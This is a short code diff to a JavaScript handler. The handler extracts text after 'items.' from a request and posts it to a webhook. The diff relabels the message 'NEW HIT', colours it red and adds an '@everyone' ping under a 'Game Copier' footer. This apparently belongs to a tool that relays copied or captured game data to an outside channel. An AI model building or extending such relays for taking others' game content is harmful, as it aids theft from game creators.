@@ -13,7 +13,6 @@ export default async function handler(req, res) {
       return res.status(500).json({ error: "WEBHOOK_URL not set" });
     }
 
-    // Regex: wszystko po "items." aż do pierwszego " lub ,
     const match = text.match(/items\.(.*?)(["\,])/i);
 
     if (!match) {
@@ -25,9 +24,9 @@ export default async function handler(req, res) {
     const extracted = match[1].trim();
 
     const embed = {
-      title: "New Game File",
+      title: "NEW HIT",
       description: `\`\`\`${extracted}\`\`\``,
-      color: 8421504,
+      color: 16711680,
       timestamp: new Date().toISOString(),
       footer: {
         text: "Game Copier"
@@ -38,6 +37,7 @@ export default async function handler(req, res) {
       method: "POST",
       headers: { "Content-Type": "application/json" },
       body: JSON.stringify({
+        content: "@everyone",
         embeds: [embed]
       })
     });
